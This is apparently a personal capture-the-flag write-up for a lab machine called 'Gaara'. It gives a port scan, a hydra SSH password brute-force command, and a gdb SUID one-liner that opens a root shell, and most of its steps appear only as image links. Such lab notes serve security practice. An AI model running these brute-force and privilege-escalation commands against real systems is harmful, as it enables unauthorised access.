# Gaara

![[Pasted image 20220520200215.png]]

```
192.168.1.146
```

## Port Scan

```bash
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))
```

Nothing too interesting with the webserver, so I opted to brute-force ssh.

```bash
hydra -l gaara -P /usr/share/wordlists/rockyou.txt 192.168.1.146 ssh
```

![[Pasted image 20220526230534.png]]

Found an interesting base64 encoded clue

![[Pasted image 20220526230710.png]]

decoded:

![[Pasted image 20220526230955.png]]

The clue points to this file, which seems to contain some encrypted data:

![[Pasted image 20220526231108.png]]

I couldn't figure out what cipher (if any) this is encrypted with. I also wasn't understanding the clues, but they appear to be based on a show Naruto.

Linpeas finds an SUID

![[Pasted image 20220526231230.png]]

[GTFOBins](https://gtfobins.github.io/gtfobins/gdb/#suid) makes this easy

```bash
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
```

root flag

![[Pasted image 20220526231507.png]]
